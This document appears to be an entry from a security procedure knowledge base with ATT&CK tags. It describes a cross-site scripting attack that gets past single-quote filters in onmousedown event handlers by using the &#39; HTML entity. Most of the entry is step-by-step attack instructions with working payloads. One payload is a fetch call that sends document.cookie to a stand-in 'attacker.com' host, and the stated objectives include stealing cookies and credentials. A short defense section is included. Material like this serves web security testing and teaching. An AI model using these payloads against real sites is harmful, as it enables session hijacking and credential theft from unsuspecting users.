---
id: 5e63251e-69c8-4edd-9315-2adc1e9d7d64
name: Cross-Site-Scripting-Single-Quote-Bypass-on-MouseDown-Event-Handler
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.475708+00:00'
updated_at: '2023-04-10T20:21:38.129078+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Bypass quotes in mousedown event]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Filter Bypass and exotic payloads]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Cross-Site-Scripting-Single-Quote-Bypass-on-MouseDown-Event-Handler

## Summary

This procedure demonstrates a reflected or stored Cross-Site Scripting (XSS) attack that bypasses single quote filtering in an onmousedown event handler by using the HTML entity &#39; to inject malicious JavaScript code. The payload executes when a user interacts with the targeted element, such as clicking a link, allowing the attacker to steal session cookies, credentials, or perform other client-side actions in the victim's browser context.

## Description

Cross-Site Scripting (XSS) vulnerabilities occur when web applications fail to properly sanitize user input, allowing attackers to inject and execute arbitrary JavaScript in the context of other users' browsers. This specific technique targets onmousedown event handlers, which trigger JavaScript on mouse button press events. If the application filters literal single quotes (') but not their HTML entity equivalent (&#39;), an attacker can close ongoing strings or attributes prematurely and inject executable code. For example, if the handler is dynamically constructed like onmousedown="var x = 'userinput'", injecting &#39;alert(1)// closes the string and appends a script execution. This is particularly effective against input fields, search boxes, or comment sections that reflect user input into HTML attributes. The attack requires no server-side access and exploits client-side rendering flaws, leading to session hijacking, keylogging, or phishing within the legitimate site's domain.

## Requirements

1. Access to a web application vulnerable to XSS, such as a form or page that reflects user input into an onmousedown event handler without proper encoding.
2. Knowledge of the event handler structure, typically identified through source code inspection or error messages revealing attribute injection points.
3. A testing environment like a browser developer console or proxy tool to craft and submit payloads.
4. Basic understanding of HTML entities and JavaScript syntax for payload construction.

## Defense

- Implement strict input sanitization and output encoding, using libraries like DOMPurify to neutralize HTML entities and script tags in user input reflected into attributes.
- Enforce Content Security Policy (CSP) headers to restrict inline script execution and limit script sources to trusted domains.
- Conduct regular security scans with tools like OWASP ZAP or Burp Suite to detect XSS vulnerabilities, and apply patches or Web Application Firewalls (WAFs) to block common payloads.
- Validate and escape all dynamic attributes in event handlers, avoiding direct concatenation of user input.

## Objectives

1. Identify and confirm an XSS vulnerability in an onmousedown event handler by bypassing single quote filters.
2. Inject and execute arbitrary JavaScript code in the victim's browser upon user interaction.
3. Exfiltrate sensitive data such as cookies or credentials to an attacker-controlled endpoint.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Examine the web page source or use a proxy to locate where user input is reflected into an onmousedown attribute, such as in a link or button element. Look for patterns like onmousedown="someFunction('input')" where single quotes are filtered but HTML entities are not.

Test basic injection by submitting a single quote (') and observing if it breaks the attribute without triggering filters.

### Step 2: Craft the Bypass Payload

**Context**: Use the HTML entity &#39; to represent a single quote, allowing closure of the existing string in the event handler and injection of JavaScript code. This evades filters targeting literal quotes while achieving the same syntactic effect.

Reference the payload code [[codes/XSS-Single-Quote-Bypass-MouseDown-Payload]] and substitute it into the vulnerable input field.

For example, if the input is reflected as onmousedown="var name = 'USER_INPUT'", submit: &#39;;alert(document.cookie)// to close the string, execute an alert with cookies, and comment out the rest.

### Step 3: Submit and Trigger the Payload

**Context**: Submit the crafted payload through the vulnerable form or parameter (e.g., via GET/POST request). Interact with the element (e.g., mouse down on the link) to trigger the event handler and execute the injected code.

Monitor the browser console or network tab for execution confirmation, such as the alert popping up or a request to an attacker server.

### Step 4: Verify and Exfiltrate Data

**Context**: Confirm successful execution by checking if the payload runs without errors. Extend the payload to exfiltrate data, e.g., &#39;;fetch('https://attacker.com?cookie='+document.cookie)// to send cookies to a controlled server.

Observe network traffic or server logs to ensure data receipt, validating the attack's impact.
